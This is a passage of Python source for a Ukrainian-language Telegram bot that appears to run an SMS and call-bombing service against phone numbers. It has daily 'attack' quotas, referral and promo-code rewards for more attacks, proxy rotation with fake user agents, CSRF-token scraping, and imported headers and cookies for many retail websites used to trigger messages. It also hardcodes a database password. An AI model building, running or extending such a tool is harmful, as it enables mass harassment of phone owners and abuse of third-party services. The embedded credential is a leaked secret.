from aiogram import *
import fake_useragent
import asyncio
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from markups import checkSubMenu
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils.exceptions import BotBlocked, UserDeactivated, ChatNotFound
from aiohttp import BasicAuth
from headers_main import (
    headers_dnipro, headers_citrus, headers_easypay, cookies_citrus, cookies_dnipro,
    headers_uvape, cookies_uvape, headers_terravape, cookies_terravape,
    headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
    headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
    cookies_elmir_call
)
import asyncpg
import config
import aiohttp
import random
import string
import re
from bs4 import BeautifulSoup 
from datetime import datetime, timedelta
import urllib.parse

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

ADMIN = [810944378]
channel_id = "-1003203193556"
message = ("Привіт.\nВаш вибір: 👇")

db_config = {
    'user': 'postgres',
    'password': 'kXcfoihheRhCgwJUzBCJxNpdSTZIRvmL',
    'database': 'railway',
    'host': 'postgres.railway.internal',
    'port': '5432',
}

# Використовуємо пул з'єднань замість одного з'єднання
db_pool = None

attack_flags = {}
# Прапорці для розіграшів
giveaway_flags = {}

# Глобальний HTTP клієнт з пулом (оптимізація)
_http_session: aiohttp.ClientSession = None
_session_lock = asyncio.Lock()

# Proxy circuit breaker та weighted cache
_proxy_cache = {}
_proxy_weights = {}
_proxy_circuit_breaker = {}  # proxy_url -> (fail_count, last_fail_time)
_proxy_cache_lock = asyncio.Lock()
USE_PROXIES = True  # Toggle для вимкнення проксі

# Service priority/weight cache
_service_weights = {}

storage = MemoryStorage()
bot = Bot(token=config.token)
dp = Dispatcher(bot, storage=storage)

async def get_http_session():
    """Перевикористання HTTP сесії з пулом конекшнів"""
    global _http_session
    async with _session_lock:
        if _http_session is None or _http_session.closed:
            connector = aiohttp.TCPConnector(limit=100, limit_per_host=20, ttl_dns_cache=300)
            timeout = aiohttp.ClientTimeout(total=10, connect=3, sock_read=5)
            _http_session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={"User-Agent": fake_useragent.UserAgent().random}
            )
            logging.debug("[HTTP] Created new session with connection pool")
        return _http_session

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(**db_config, min_size=5, max_size=20)
    
    # Отримуємо інформацію про бота для обробки згадок
    try:
        bot._me = await bot.get_me()
    except Exception as e:
        logging.error(f"Помилка отримання інформації про бота: {e}")
    
    async with db_pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                name TEXT,
                username TEXT,
                block INTEGER DEFAULT 0,
                attacks_left INTEGER DEFAULT 30,
                promo_attacks INTEGER DEFAULT 0,
                referral_attacks INTEGER DEFAULT 0,
                unused_referral_attacks INTEGER DEFAULT 0,
                last_attack_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                referrer_id BIGINT,
                referral_count INTEGER DEFAULT 0,
                referral_notification_sent BOOLEAN DEFAULT FALSE
            );
            CREATE TABLE IF NOT EXISTS blacklist (
                phone_number TEXT PRIMARY KEY
            );
            CREATE TABLE IF NOT EXISTS referrals (
                id SERIAL PRIMARY KEY,
                referrer_id BIGINT,
                referred_id BIGINT,
                join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(referred_id)
            );
            CREATE TABLE IF NOT EXISTS proxies (
                id SERIAL PRIMARY KEY,
                proxy_url TEXT UNIQUE NOT NULL,
                last_check TIMESTAMP,
                avg_latency_ms INTEGER DEFAULT 0,
                success_count INTEGER DEFAULT 0,
                fail_count INTEGER DEFAULT 0,
                is_active BOOLEAN DEFAULT TRUE
            );
            CREATE TABLE IF NOT EXISTS user_messages (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                message_text TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS promocodes (
                id SERIAL PRIMARY KEY,
                code TEXT UNIQUE NOT NULL,
                attacks_count INTEGER NOT NULL,
                valid_until TIMESTAMP NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT TRUE
            );
            CREATE TABLE IF NOT EXISTS promo_activations (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                promo_code TEXT,
                activated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP NOT NULL,
                attacks_added INTEGER,
                UNIQUE(user_id, promo_code)
            );
        ''')
        
        # Додаємо нові колонки якщо їх немає
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS promo_attacks INTEGER DEFAULT 0')
        except Exception as e:
            logging.error(f"Error adding promo_attacks column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_count INTEGER DEFAULT 0')
        except Exception as e:
            logging.error(f"Error adding referral_count column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referrer_id BIGINT')
        except Exception as e:
            logging.error(f"Error adding referrer_id column: {e}")

        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_notification_sent BOOLEAN DEFAULT FALSE')
        except Exception as e:
            logging.error(f"Error adding referral_notification_sent column: {e}")
            
        try:
            await conn.execute('ALTER TABLE users ALTER COLUMN last_attack_date TYPE TIMESTAMP USING last_attack_date::timestamp')
        except Exception as e:
            logging.error(f"Error changing last_attack_date column type: {e}")

        # Ensure default daily limit is 30 for existing rows on a new day reset
        try:
            await conn.execute("UPDATE users SET attacks_left = 30 WHERE attacks_left IS NULL")
        except Exception as e:
            logging.error(f"Error normalizing attacks_left defaults: {e}")
        
        # Create indexes for better performance
        try:
            await conn.execute('CREATE INDEX IF NOT EXISTS idx_users_block ON users(block)')
            await conn.execute('CREATE INDEX IF NOT EXISTS idx_users_last_attack_date ON users(last_attack_date)')
            await conn.execute('CREATE INDEX IF NOT EXISTS idx_referrals_referrer ON referrals(referrer_id)')
            await conn.execute('CREATE INDEX IF NOT EXISTS idx_referrals_referred ON referrals(referred_id)')
            await conn.execute('CREATE INDEX IF NOT EXISTS idx_proxies_active ON proxies(is_active, last_check)')
            await conn.execute('CREATE INDEX IF NOT EXISTS idx_blacklist_phone ON blacklist(phone_number)')
            logging.info("[DB] Indexes created/verified")
        except Exception as e:
            logging.error(f"Error creating indexes: {e}")

    # Load proxies from local files (if present)
    try:
        await load_proxies_from_possible_files()
        await normalize_existing_proxies()
    except Exception as e:
        logging.error(f"Proxy file load error: {e}")

class Dialog(StatesGroup):
    spam = State()
    block_user = State()
    unblock_user = State()
    create_promo = State()
    create_promo_attacks = State()
    create_promo_hours = State()
    delete_promo = State()
    enter_promo = State()
    add_to_blacklist = State()

async def email():
    name_length = random.randint(6, 12)
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
    generated_email = f"{name}@gmail.com"
    logging.info(f"email: {generated_email}")
    return generated_email

async def get_csrf_token(url, headers=None):
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            html = await response.text()
            soup = BeautifulSoup(html, "html.parser")

            csrf_token = soup.find("input", {"name": "_csrf"})
            if csrf_token:
                return csrf_token.get("value")
            
            meta_token = soup.find("meta", {"name": "csrf-token"})
            if meta_token:
                return meta_token.get("content")
            
            raise ValueError("CSRF-токен не знайдено.")

def get_cancel_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🛑 Зупинити атаку", callback_data="cancel_attack"))
    return keyboard

async def check_subscription_status(user_id):
    try:
        member = await bot.get_chat_member(chat_id=channel_id, user_id=user_id)
        if member.status in {"member", "administrator", "creator"}:
            return True
    except Exception as e:
        logging.error(f"Помилка: {e}")
    return False

async def anti_flood(*args, **kwargs):
    m = args[0]
    # Перевіряємо, що повідомлення з особистого чату
    if m.chat.type == 'private':
        await m.answer("Спокійно, не поспішай! 🐢")

# Оновлюємо клавіатури
profile_button = types.KeyboardButton('🎯 Почати атаку')
referal_button = types.KeyboardButton('🆘 Допомога')
referral_program_button = types.KeyboardButton('🎪 Запросити друга')
check_attacks_button = types.KeyboardButton('❓ Перевірити атаки')
# promo_button = types.KeyboardButton('Промокод 🎁')  # Прибрано
profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button).add(referral_program_button, check_attacks_button)

admin_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
admin_keyboard.add("Надіслати повідомлення користувачам")
admin_keyboard.add("Додати номер до чорного списку")
admin_keyboard.add("Статистика бота")
admin_keyboard.add("Заблокувати користувача")
admin_keyboard.add("Розблокувати користувача")
admin_keyboard.add("Реферали")
admin_keyboard.add("Створити промокод")
admin_keyboard.add("Видалити промокод")
admin_keyboard.add("Список промокодів")
admin_keyboard.add("Перевірка проксі")
admin_keyboard.add("Увімкнути/вимкнути проксі")
admin_keyboard.add("Перезавантажити проксі з файлу")
admin_keyboard.add("Назад")

def generate_promo_code():
    """Генерує промокод з заголовних літер та цифр довжиною 10-20 символів"""
    length = random.randint(10, 20)
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choices(characters, k=length))

async def add_user(user_id: int, name: str, username: str, referrer_id: int = None):
    today = datetime.now().date()
    async with db_pool.acquire() as conn:
        await conn.execute(
            'INSERT INTO users (user_id, name, username, block, attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date, referrer_id) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10) ON CONFLICT (user_id) DO NOTHING',
            user_id, name, username, 0, 30, 0, 0, 0, today, referrer_id
        )
        
        if referrer_id:
            await conn.execute(
                'INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING',
                referrer_id, user_id
            )
            
            await conn.execute(
                'UPDATE users SET referral_attacks = referral_attacks + 10, referral_count = referral_count + 1 WHERE user_id = $1',
                referrer_id
            )
            # Бонус запрошеному користувачу на один день
            await conn.execute(
                'UPDATE users SET referral_attacks = referral_attacks + 10 WHERE user_id = $1',
                user_id
            )

            try:
                ref_name = username or name or f"User{user_id}"
                await bot.send_message(
                    referrer_id,
                    f"🎉 За вашим посиланням приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +10 додаткових атак на один день!",
                    parse_mode='HTML'
                )
            except Exception as e:
                logging.error(f"Error notifying referrer {referrer_id}: {e}")
        
        profile_link = f'<a href="tg://user?id={user_id}">{name}</a>'
        for admin_id in ADMIN:
            try:
                await bot.send_message(admin_id, f"Новий користувач зареєструвався у боті:\nІм'я: {profile_link}", parse_mode='HTML')
            except Exception as e:
                logging.error(f"Помилка при відправленні адміну {admin_id}: {e}")

async def startuser(message:types.Message):
    user_id = message.from_user.id
    if await check_subscription_status(user_id):
        await message.answer(message, reply_markup=profile_keyboard)
    else:
        await message.answer("Ви не підписані", reply_markup=checkSubMenu)

@dp.message_handler(commands=['start'])
async def start(message: Message):
    # Перевіряємо, що команда з особистого чату
    if message.chat.type != 'private':
        return  # Ігноруємо команду /start в групах
    
    user_id = message.from_user.id
    args = message.get_args()
    referrer_id = None
    if args and args.isdigit():
        referrer_id = int(args)
        if referrer_id == user_id:
            referrer_id = None
        else:
            async with db_pool.acquire() as conn:
                referrer_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', referrer_id)
                if not referrer_exists:
                    referrer_id = None
    
    if not await check_subscription_status(user_id):
        # Зберігаємо повідомлення /start з аргументом для подальшої обробки після підписки
        async with db_pool.acquire() as conn:
            await conn.execute(
                'INSERT INTO user_messages (user_id, message_text) VALUES ($1, $2)',
                user_id, message.text
            )
        logging.info(f"Збережена інформація про реферальне посилання: user_id={user_id}, referrer_id={referrer_id}")
        await message.answer("Для використання бота потрібно підписатися на наш канал!", reply_markup=checkSubMenu)
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow('SELECT block FROM users WHERE user_id = $1', user_id)
    
    if message.from_user.id in ADMIN:
        await message.answer('Введіть команду /admin', reply_markup=profile_keyboard)
    else:
        if result is None:
            # Новий користувач — додаємо з реферальним id, якщо є
            await add_user(message.from_user.id, message.from_user.full_name, message.from_user.username, None)
            # Після додавання користувача нараховуємо реферальні атаки, якщо є реферер
            if referrer_id:
                await process_referral(referrer_id, message.from_user.id, message.from_user.username, message.from_user.full_name)
        
        if result and result['block'] == 1:
            await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
            return
        
        welcome_text = f"🎉 Вітаю, {message.from_user.first_name}!\n\n"
        welcome_text = 'Використовуючи бота ви автоматично погоджуєтесь з <a href="https://telegra.ph/Umovi-vikoristannya-10-26-2">умовами використання</a>\n\n'

        
        await bot.send_message(user_id, welcome_text, reply_markup=profile_keyboard, parse_mode='HTML')

@dp.callback_query_handler(text="subchanneldone")
async def process_subscription_confirmation(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    if await check_subscription_status(user_id):
        async with db_pool.acquire() as conn:
            user_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', user_id)
            
            if not user_exists:
                referrer_id = None
                try:
                    last_start_message = await conn.fetchval(
                        'SELECT message_text FROM user_messages WHERE user_id = $1 AND message_text LIKE \'/start%\' ORDER BY timestamp DESC LIMIT 1',
                        user_id
                    )
                    
                    logging.info(f"Останнє повідомлення /start: {last_start_message}")
                    
                    if last_start_message and ' ' in last_start_message:
                        args = last_start_message.split(' ')[1]
                        if args.isdigit():
                            referrer_id = int(args)
                            if referrer_id == user_id:
                                referrer_id = None
                            else:
                                referrer_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', referrer_id)
                                if not referrer_exists:
                                    referrer_id = None
                    
                    logging.info(f"Знайдено referrer_id: {referrer_id}")
                except Exception as e:
                    logging.error(f"Помилка при отриманні referrer_id: {e}")
                
                await add_user(callback_query.from_user.id, callback_query.from_user.full_name, callback_query.from_user.username, None)
                # Після додавання користувача нараховуємо реферальні атаки, якщо є реферер
                if referrer_id:
                    await process_referral(referrer_id, callback_query.from_user.id, callback_query.from_user.username, callback_query.from_user.full_name)
                
                if referrer_id:
                    await conn.execute(
                        'UPDATE users SET referral_count = referral_count + 1 WHERE user_id = $1',
                        referrer_id
                    )
                    
                    await conn.execute(
                        'INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING',
                        referrer_id, user_id
                    )
                    
                    logging.info(f"Друга зараховано: referrer_id={referrer_id}, referred_id={user_id}")
                    
                    referrer_data = await conn.fetchrow(
                        'SELECT referral_count, referral_notification_sent FROM users WHERE user_id = $1',
                        referrer_id
                    )
                    
                    if (referrer_data and 
                        referrer_data['referral_count'] >= 20 and 
                        not referrer_data['referral_notification_sent']):
                        for admin_id in ADMIN:
                            try:
                                await bot.send_message(
                                    admin_id,
                                    f"🎉 Користувач <a href='tg://user?id={referrer_id}'>@{callback_query.from_user.username or 'User'}</a> досягнув 20 рефералів!",
                                    parse_mode='HTML'
                                )
                                await conn.execute(
                                    'UPDATE users SET referral_notification_sent = TRUE WHERE user_id = $1',
                                    referrer_id
                                )
                            except Exception as e:
                                logging.error(f"Помилка при повідомленні адміну {admin_id}: {e}")
                
                welcome_text = f"🎉 Ласкаво просимо, {callback_query.from_user.first_name}!\n\n"
                welcome_text += "🎯 Ви успішно підписалися і тепер можете користуватися ботом.\n\n"
                
                await callback_query.message.edit_text(welcome_text, parse_mode='HTML')
                await callback_query.message.answer("Оберіть дію:", reply_markup=profile_keyboard)
            else:
                welcome_text = f"🎉 З поверненням, дуже на тебе чекали, {callback_query.from_user.first_name}!\n\n"
                welcome_text = 'Використовуючи бота ви автоматично погоджуєтесь з <a href="https://telegra.ph/Umovi-vikoristannya-10-26-2">умовами використання</a>\n\n'

                
                await callback_query.message.edit_text(welcome_text, parse_mode='HTML')
                await callback_query.message.answer("Оберіть дію:", reply_markup=profile_keyboard)
    else:
        await callback_query.answer("Ви ще не підписалися на канал!", show_alert=True)

@dp.message_handler(commands=['admin'])
async def admin(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(f'{message.from_user.first_name}, оберіть дію👇', reply_markup=admin_keyboard)
    else:
        await message.answer('☝️Ви не адміністратор')

# ПРОМОКОДЫ - АДМИН ПАНЕЛЬ

@dp.message_handler(text="Створити промокод")
async def create_promo_start(message: Message):
    if message.from_user.id in ADMIN:
        await Dialog.create_promo_attacks.set()
        await message.answer("🎁 <b>Створення промокоду</b>\n\nВведіть кількість атак для промокоду:\n\n💡 Ви можете написати <b>Скасувати</b> для відміни.", parse_mode="html")
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.create_promo_attacks)
async def create_promo_attacks(message: Message, state: FSMContext):
    text = message.text.strip()
    
    # Перевіряємо на скасування
    if text.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    try:
        attacks = int(text)
        if attacks <= 0:
            await message.answer("❌ Кількість атак має бути більше 0.\n\nВведіть число або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
            return
        
        await state.update_data(attacks=attacks)
        await Dialog.create_promo_hours.set()
        await message.answer("⏰ Введіть строк дії промокоду в годинах (час, протягом якого користувачі зможуть ввести промокод) ЧАС МАЄ БУТИ +3 ГОДИНИ ВІД ПОТРІБНОГО:\n\n💡 Напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
    except ValueError:
        await message.answer("❌ Введіть коректне число.\n\nСпробуйте ще раз або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")

@dp.message_handler(state=Dialog.create_promo_hours)
async def create_promo_hours(message: Message, state: FSMContext):
    text = message.text.strip()
    
    # Перевіряємо на скасування
    if text.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    try:
        hours = int(text)
        if hours <= 0:
            await message.answer("❌ Кількість годин має бути більше 0.\n\nВведіть число або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
            return
        
        data = await state.get_data()
        attacks = data['attacks']
        
        # Генеруємо унікальний промокод
        async with db_pool.acquire() as conn:
            while True:
                promo_code = generate_promo_code()
                existing = await conn.fetchval('SELECT 1 FROM promocodes WHERE code = $1', promo_code)
                if not existing:
                    break
            
            # Створюємо промокод
            valid_until = datetime.now() + timedelta(hours=hours)
            await conn.execute(
                'INSERT INTO promocodes (code, attacks_count, valid_until) VALUES ($1, $2, $3)',
                promo_code, attacks, valid_until
            )
        
        await message.answer(
            f"✅ Промокод створено!\n\n"
            f"🎁 Код: <code>{promo_code}</code>\n"
            f"⚔️ Атак: {attacks}\n"
            f"⏰ Діє до: {valid_until.strftime('%d.%m.%Y %H:%M')}\n"
            f"📝 Промокод можна ввести протягом {hours} годин\n"
            f"🕐 Після активації діє 24 години",
            parse_mode='HTML',
            reply_markup=profile_keyboard
        )
        
        await state.finish()
    except ValueError:
        await message.answer("❌ Введіть коректне число.\n\nСпробуйте ще раз або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")

@dp.message_handler(text="Видалити промокод")
async def delete_promo_start(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            promos = await conn.fetch('SELECT code, attacks_count, valid_until FROM promocodes WHERE is_active = TRUE ORDER BY created_at DESC')
        
        if not promos:
            await message.answer("Немає активних промокодів для видалення.")
            return
        
        text = "🗑️ Активні промокоди:\n\n"
        for promo in promos:
            text += f"• <code>{promo['code']}</code> - {promo['attacks_count']} атак (до {promo['valid_until'].strftime('%d.%m.%Y %H:%M')})\n"
        
        text += "\nВведіть код промокоду для видалення:\n\n💡 Ви можете написати <b>Скасувати</b> для відміни."
        
        await Dialog.delete_promo.set()
        await message.answer(text, parse_mode='HTML')
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.delete_promo)
async def delete_promo_process(message: Message, state: FSMContext):
    promo_code = message.text.strip()
    
    # Перевіряємо на скасування
    if promo_code.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    promo_code = promo_code.upper()
    
    async with db_pool.acquire() as conn:
        # Перевіряємо існування промокоду
        promo = await conn.fetchrow('SELECT * FROM promocodes WHERE code = $1 AND is_active = TRUE', promo_code)
        
        if not promo:
            await message.answer("❌ Промокод не знайдено або вже видалено.\n\nВведіть код або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
            return
        
        # Деактивуємо промокод
        await conn.execute('UPDATE promocodes SET is_active = FALSE WHERE code = $1', promo_code)
    
    await message.answer(f"✅ Промокод <code>{promo_code}</code> успішно видалено!", parse_mode='HTML', reply_markup=profile_keyboard)
    await state.finish()

@dp.message_handler(text="Список промокодів")
async def list_promos(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            promos = await conn.fetch('''
                SELECT code, attacks_count, valid_until, created_at, is_active,
                       (SELECT COUNT(*) FROM promo_activations WHERE promo_code = code) as used_count
                FROM promocodes 
                ORDER BY created_at DESC
            ''')
        
        if not promos:
            await message.answer("Промокодів поки що немає.")
            return
        
        text = "📋 <b>Всі промокоди:</b>\n\n"
        
        for promo in promos:
            status = "🟢 Активний" if promo['is_active'] else "🔴 Видалено"
            if promo['is_active'] and datetime.now() > promo['valid_until']:
                status = "⏰ Закінчився"
            
            text += f"• <code>{promo['code']}</code>\n"
            text += f"  ⚔️ Атак: {promo['attacks_count']}\n"
            text += f"  📅 Створено: {promo['created_at'].strftime('%d.%m.%Y %H:%M')}\n"
            text += f"  ⏰ До: {promo['valid_until'].strftime('%d.%m.%Y %H:%M')}\n"
            text += f"  👥 Використано: {promo['used_count']} разів\n"
            text += f"  📊 Статус: {status}\n\n"
        
        await message.answer(text, parse_mode='HTML')
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(text="Перевірка проксі")
async def proxy_check_menu(message: Message):
    if message.from_user.id not in ADMIN:
        await message.answer('Недостатньо прав.')
        return
    await message.answer('🔎 Запускаю перевірку проксі...')
    # If empty, try to (re)load from files first
    async with db_pool.acquire() as conn:
        count = await conn.fetchval('SELECT COUNT(*) FROM proxies WHERE is_active = TRUE')
    if not count:
        try:
            await load_proxies_from_possible_files()
        except Exception as e:
            logging.error(f"Reload proxies error: {e}")
    await ensure_recent_proxy_check(max_age_minutes=0)
    # Формуємо звіт
    async with db_pool.acquire() as conn:
        rows = await conn.fetch('SELECT proxy_url, last_check, avg_latency_ms, success_count, fail_count FROM proxies WHERE is_active = TRUE ORDER BY proxy_url')
    if not rows:
        await message.answer('Проксі не додані.')
        return
    
    # Розділяємо на частини (максимум 10 проксі на повідомлення)
    PROXIES_PER_MESSAGE = 10
    total_count = len(rows)
    
    for i in range(0, len(rows), PROXIES_PER_MESSAGE):
        chunk = rows[i:i + PROXIES_PER_MESSAGE]
        part_num = (i // PROXIES_PER_MESSAGE) + 1
        total_parts = (len(rows) + PROXIES_PER_MESSAGE - 1) // PROXIES_PER_MESSAGE
        
        lines = [f"📡 Перевірка проксі (частина {part_num}/{total_parts}, всього: {total_count}):\n"]
        for r in chunk:
            total = r['success_count'] + r['fail_count']
            rate = (r['success_count'] * 100 // total) if total > 0 else 0
            last = r['last_check'].strftime('%d.%m.%Y %H:%M') if r['last_check'] else '—'
            # Скорочений формат для економії місця
            lines.append(f"• {mask_proxy_for_log(r['proxy_url'])}\n  ├ {rate}% | {r['avg_latency_ms']}мс | {last}")
        
        await message.answer('\n'.join(lines))
        # Невелика пауза між повідомленнями
        if i + PROXIES_PER_MESSAGE < len(rows):
            await asyncio.sleep(0.3)

@dp.message_handler(text="Увімкнути/вимкнути проксі")
async def toggle_proxies(message: Message):
    global USE_PROXIES
    if message.from_user.id not in ADMIN:
        await message.answer('Недостатньо прав.')
        return
    USE_PROXIES = not USE_PROXIES
    status = "увімкнено" if USE_PROXIES else "вимкнено"
    await message.answer(f"✅ Проксі тепер <b>{status}</b>", parse_mode='HTML')

@dp.message_handler(text="Перезавантажити проксі з файлу")
async def reload_proxies(message: Message):
    if message.from_user.id not in ADMIN:
        await message.answer('Недостатньо прав.')
        return
    await message.answer('🔄 Перезавантажую проксі з файлу...')
    try:
        # Очищаємо кеш проксі
        async with _proxy_cache_lock:
            _proxy_cache.clear()
            _proxy_weights.clear()
            _proxy_circuit_breaker.clear()
        
        # Завантажуємо з файлів
        await load_proxies_from_possible_files()
        # Нормалізуємо існуючі
        await normalize_existing_proxies()
        
        # Рахуємо скільки проксі завантажено
        async with db_pool.acquire() as conn:
            count = await conn.fetchval('SELECT COUNT(*) FROM proxies WHERE is_active = TRUE')
        
        await message.answer(f"✅ Проксі перезавантажено!\n\n📊 Всього активних проксі: <b>{count}</b>", parse_mode='HTML')
    except Exception as e:
        logging.error(f"[PROXY] Error reloading proxies: {e}")
        await message.answer(f"❌ Помилка при перезавантаженні проксі: {e}")

# ПРОМОКОДЫ - ПОЛЬЗОВАТЕЛИ

@dp.message_handler(text='Промокод 🎁')
async def promo_handler(message: types.Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return

    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    await Dialog.enter_promo.set()
    await message.answer("🎁 Введіть промокод:")

@dp.message_handler(state=Dialog.enter_promo)
async def process_promo(message: Message, state: FSMContext):
    user_id = message.from_user.id
    promo_code = message.text.strip().upper()
    
    async with db_pool.acquire() as conn:
        # Перевіряємо існування та активність промокоду
        promo = await conn.fetchrow('''
            SELECT * FROM promocodes 
            WHERE code = $1 AND is_active = TRUE AND valid_until > $2
        ''', promo_code, datetime.now())
        
        if not promo:
            await message.answer("❌ Промокод недійсний або закінчився строк його дії.")
            await state.finish()
            return
        
        # Перевіряємо, чи не використовував користувач вже цей промокод
        already_used = await conn.fetchval('''
            SELECT 1 FROM promo_activations 
            WHERE user_id = $1 AND promo_code = $2
        ''', user_id, promo_code)
        
        if already_used:
            await message.answer("❌ Ви вже використали цей промокод.")
            await state.finish()
            return
        
        # Активуємо промокод
        expires_at = datetime.now() + timedelta(hours=24)
        
        await conn.execute('''
            INSERT INTO promo_activations (user_id, promo_code, expires_at, attacks_added)
            VALUES ($1, $2, $3, $4)
        ''', user_id, promo_code, expires_at, promo['attacks_count'])
        
        # Додаємо атаки користувачу
        await conn.execute('''
            UPDATE users SET promo_attacks = promo_attacks + $1 WHERE user_id = $2
        ''', promo['attacks_count'], user_id)
    
    await message.answer(
        f"🎉 Промокод успішно активовано!\n\n"
        f"⚔️ Додано атак: {promo['attacks_count']}\n"
        f"⏰ Діє до: {expires_at.strftime('%d.%m.%Y %H:%M')}\n\n"
        f"💡 Атаки від промокоду згорять при наступній щоденній роздачі атак.",
        parse_mode='HTML'
    )
    
    await state.finish()

# Остальные обработчики...

@dp.message_handler(text="Статистика бота")
async def bot_stats(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            # Отримуємо загальну кількість користувачів
            total_users = await conn.fetchval('SELECT COUNT(*) FROM users')
            
            # Отримуємо кількість активних користувачів (тих, хто не заблокував бота)
            active_users = 0
            users = await conn.fetch('SELECT user_id FROM users')
            
            for user in users:
                try:
                    # Перевіряємо, чи може бот надіслати повідомлення користувачу
                    await bot.send_chat_action(user['user_id'], 'typing')
                    active_users += 1
                except (BotBlocked, UserDeactivated, ChatNotFound):
                    continue
                except Exception as e:
                    logging.error(f"Помилка при перевірці користувача {user['user_id']}: {e}")
                    continue
            
            # Отримуємо кількість заблокованих користувачів
            blocked_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE block = 1')
            
            # Отримуємо кількість користувачів з рефералами
            users_with_referrals = await conn.fetchval('SELECT COUNT(*) FROM users WHERE referral_count > 0')
            
            # Отримуємо загальну кількість рефералів
            total_referrals = await conn.fetchval('SELECT COUNT(*) FROM referrals')
            
            # Отримуємо кількість користувачів, які досягли 20 рефералів
            vip_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE referral_count >= 20')
            
            # Статистика промокодов
            total_promos = await conn.fetchval('SELECT COUNT(*) FROM promocodes')
            active_promos = await conn.fetchval('SELECT COUNT(*) FROM promocodes WHERE is_active = TRUE AND valid_until > $1', datetime.now())
            promo_activations = await conn.fetchval('SELECT COUNT(*) FROM promo_activations')
        
        message_text = (
            f"📊 <b>Статистика бота</b>\n\n"
            f"👥 Всього користувачів: {total_users}\n"
            f"✅ Активних користувачів: {active_users}\n"
            f"🚫 Заблокованих користувачів: {blocked_users}\n"
            f"📈 Користувачів з рефералами: {users_with_referrals}\n"
            f"🔗 Всього рефералів: {total_referrals}\n"
            f"⭐ VIP користувачів (20+ рефералів): {vip_users}\n\n"
            f"🎁 <b>Промокоди:</b>\n"
            f"📋 Всього створено: {total_promos}\n"
            f"🟢 Активних: {active_promos}\n"
            f"✨ Активацій: {promo_activations}"
        )
        
        await message.answer(message_text, parse_mode="HTML")
    else:
